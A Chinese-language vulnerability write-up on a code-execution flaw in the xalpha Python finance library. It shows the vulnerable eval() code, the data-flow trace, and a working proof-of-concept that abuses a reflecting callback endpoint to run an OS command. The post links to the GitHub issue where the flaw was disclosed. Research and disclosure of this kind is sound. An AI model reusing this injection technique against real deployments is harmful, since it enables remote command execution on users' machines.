---
title: CVE实战 巧挖国产金融类python api库漏洞-高危命令执行0day
published: true
---
# [](#header-1)0x00、前言  

最近资产搜集，发现某国内金融资产后端用该框架进行金融数据分析，于是浅浅记录一下挖洞过程  

整个过程非常的舒服，写个博客记录一下  

这个地方犯了部分错误，让我在构造整个利用链的过程中还是比较舒服的，没有费脑子

就算遇到无法绕过的死路，也不至于推翻之前的构造链全部重新来过  

当然，这次挖掘在代码绕过方面也走了一点弯路，浪费了不少时间，吸取一下教训  

复现：
至少需要装python3  
xalpha==0.11.4库可以从github上下载，但最好用pip3直接就能把库拉到本地  

环境配置完毕后，执行以下代码  
```python
import xalpha
xalpha.fundinfo("../gaoduan/PinzhongRightApi.aspx?fc=AF5097&callback=jQuery183037745026472073073_ Data_netWorthTrend = __import__('os').system('echo 成功触发'); &_=1688890155531#")
```
就可以看到代码:'echo 成功触发'成功被执行

# [](#header-1)0x01、构造过程

首先，明确方向. 先放fortify里面扫一遍，整个项目中只发现了一个超高危险函数eval()，那么我们先从这里下手看看有没有利用点

eval()所在的核心部分：
```python
    def _basic_init(self):
        if self.code.startswith("96"):
            self._hkfund_init()  # 中港互认基金处理
            return
        self._page = rget(self._url)
        if self._page.status_code == 404:
            raise ParserFailure("Unrecognized fund, please check fund code you input.")
        if self._page.text[:800].find("Data_millionCopiesIncome") >= 0:
            raise FundTypeError("This code seems to be a mfund, use mfundinfo instead")

        l = re.match(
            r"[\s\S]*Data_netWorthTrend = ([^;]*);[\s\S]*", self._page.text
        ).groups()[0]
        l = l.replace("null", "None")  # 暂未发现基金净值有 null 的基金，若有，其他地方也很可能出问题！
        l = eval(l)
```

经过观测发现，static class xalpha.fundinfo.__init__可以作为切入点改变static class xalpha.fundinfo._basic_init中调用的类变量，最终调用eval

在__init__中，发现了可能的调用路径使__init__(payload) 转换为 _basic_init 中将会调用的 self._url  
payload -> self._url 变量变化链如下所示：
```python
payload
↓
payload = payload.zfill(6)
↓
self._url = "http://fund.eastmoney.com/pingzhongdata/" + payload + ".js"
```
最终self._url = "http://fund.eastmoney.com/pingzhongdata/" + payload.zfill(6) + ".js"  

然后，在某个不远的堆栈中，将会调用 _basic_init(self)，在 _basic_init 中发现了可能的调用路径使变量 self._url 转换为 eval 的实参 l  
self._url -> l 变量变化链如下所示：
```python
self._page = rget(self._url)
↓
l = re.match(
    r"[\s\S]*Data_netWorthTrend = ([^;]*);[\s\S]*", self._page.text
).groups()[0]
↓
l = l.replace("null", "None")
```
最终l = (re.match(
    r"[\s\S]*Data_netWorthTrend = ([^;]*);[\s\S]*", rget("http://fund.eastmoney.com/pingzhongdata/" + payload.zfill(6) + ".js").text
).groups()[0]).replace("null", "None")

那么现在就有一个非常棘手的问题摆在眼前：如何让payload变量经过该网站请求后依然得到我们想要的结果？

我起初认为这个问题很好解决，直接在该网站的搜索栏、错误界面中搜索看看返回的数据是否可控，发现失败了. 该网站正常业务请求任何信息，所返回的数据中均不携带任何原先信息(我猜想网站建设者在建设时也考虑到了这一点)  
再想构造一个xss，想让网站返回想要的结果，也失败了

经过半天的找寻，终于发现一个回调函数接口有问题，请求错误回调函数名称时，响应中正好会包含该错误的函数名称. 正好能满足我们的需求:发送错误数据，并让该网站返回我们想要的结果，即返回数据可控  
回调函数接口如下
```
http://fund.eastmoney.com/pingzhongdata/../gaoduan/PinzhongRightApi.aspx?fc=AF5097&callback=jQuery183037745026472073073_ Data_netWorthTrend=[需要返回的错误数据]&_=1688890155531#
```
最后，正则成功捕获到该数据并正确处理，最后成功eval

# [](#header-1)0x02、结果

[https://github.com/refraction-ray/xalpha/issues/175](https://github.com/refraction-ray/xalpha/issues/175)  
与仓库管理者的更多对话，包括对问题的解决方案的建议都写在issue里，比较完整  

比较有趣的是，repository负责人以为只是一个普通的local command execute，后来仔细想才发现不对劲。经过和负责人探讨后才发现这个漏洞疑似是用户交pull request时负责人没有仔细检查用户代码才造成的


